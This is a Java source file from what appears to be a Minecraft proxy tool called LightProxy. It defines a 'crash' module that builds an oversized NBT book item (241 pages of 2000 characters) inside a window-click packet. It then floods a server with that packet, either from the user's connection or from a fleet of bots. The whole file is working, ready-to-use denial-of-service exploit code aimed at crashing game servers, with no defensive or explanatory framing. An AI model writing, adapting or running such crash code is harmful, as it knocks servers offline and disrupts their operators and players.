/*
 * LightProxy
 * Copyright (C) 2021.  VenixPLL
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package pl.venixpll.system.crash.impl;

import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import pl.venixpll.mc.data.game.WindowAction;
import pl.venixpll.mc.data.item.ItemStack;
import pl.venixpll.mc.objects.Player;
import pl.venixpll.mc.packet.Packet;
import pl.venixpll.mc.packet.impl.client.play.ClientPlayerWindowActionPacket;
import pl.venixpll.system.crash.Crash;
import pl.venixpll.system.crash.CrashType;

import java.util.List;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class CrashBasic2 extends Crash {
    private Packet packet;

    public CrashBasic2() {
        super("basic2", CrashType.NBT);
    }

    @Override
    public void init() {

        final AtomicReference<String> pageContent = new AtomicReference<>();
        pageContent.set("");

        IntStream.range(0, 2000).forEach(i -> pageContent.set(pageContent.get() + "_"));

        final NBTTagCompound compound = new NBTTagCompound();

        final List<NBTBase> list = IntStream.range(0, 241)
                .mapToObj(ia -> new NBTTagString(pageContent.get()))
                .collect(Collectors.toList());

        final NBTTagList pages = new NBTTagList();
        list.forEach(pages::appendTag);

        compound.setTag("pages", pages);
        compound.setTag("title", new NBTTagString("Lubie bobry"));
        compound.setTag("author", new NBTTagString("Nawet bardzo es"));

        final ItemStack itemStack = new ItemStack(386, 1, 0, compound);
        this.packet = new ClientPlayerWindowActionPacket(0, (short) 37, 1, WindowAction.CLICK_ITEM, -999, itemStack);
    }

    @Override
    public void execute(String message, Player sender) {

        if (packet == null) {
            sender.sendChatMessage("&cFailed to initialize crash!");
            return;
        }

        try {
            final String[] args = message.split(" ");
            final int amount = Integer.parseInt(args[2]);
            if (sender.getBots().size() == 0) {
                IntStream.range(0, amount).forEach(i -> sender.getConnector().sendPacket(packet));
                sender.sendChatMessage("&aCrashing complete! &8(&6USER&8)");
            } else {
                sender.getBots().forEach(b -> IntStream.range(0, amount).forEach(i -> b.getConnection().sendPacket(packet)));
                sender.sendChatMessage("&aCrashing complete! &8(&6BOTS&8)");
            }
        } catch (final Throwable t) {
            sender.sendChatMessage("&cError occured during crashing! &8(&6" + t.getClass().getSimpleName() + "&8)");
        }
    }
}
